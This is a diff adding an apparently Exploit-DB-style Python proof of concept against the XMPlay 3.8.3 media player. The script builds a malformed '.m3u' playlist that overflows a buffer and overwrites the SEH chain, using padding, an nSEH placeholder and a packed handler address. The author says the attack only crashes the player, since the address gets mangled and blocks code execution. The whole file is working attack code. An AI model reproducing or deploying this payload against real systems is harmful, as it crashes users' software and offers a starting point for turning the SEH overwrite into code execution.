@@ -1,0 +1,44 @@
+# Exploit Title: XMPlay 3.8.3 - '.m3u' Denial of Service (PoC)
+# Date: 2018-11-18
+# Exploit Author: s7acktrac3
+# Vendor Homepage: https://www.xmplay.com/
+# Software Link: https://support.xmplay.com/files_view.php?file_id=676
+# Version: 3.8.3 (latest)
+# Tested on: Windows XP/7/8
+# CVE : N/A
+#
+# Lauch XMPlay and either drag xmplay.m3u into the XMPlay window or
+# File Menu-> select winamp.m3u and Crash!
+# -*- coding: utf-8 -*-
+#
+# Note: Successfully can overwrite the SEH chain & control the handler and nSEH
+# but the address get mangled & unreconizable, for this reason could not turn into
+# code execution.
+
+import struct
+from struct import pack
+
+file_data = "#EXTM3U\n\r"
+file_data += "#EXTINF:200,Sleep Away\n\r"
+file_data += "http://test."
+
+max_size = 3000 - 1
+nseh_offset = 656
+
+seh_overwrite = pack("<L", 0x00402450)
+
+payload = "A" * nseh_offset	# padding for nseh
+payload += "BBBB"				# nseh
+payload += seh_overwrite		# seh
+
+#padding for rest of payload - pipe "|" is needed somehow to force crash 
+payload += "D" *(max_size - len(payload)) + "|"
+print "[+] Creating .m3u file with payload size: "+ str(len(payload))
+
+exploit = file_data + payload
+
+file = open('xmplay.m3u','w');
+file.write(exploit);
+file.close();
+ 
+print "[+] Done creating the file"
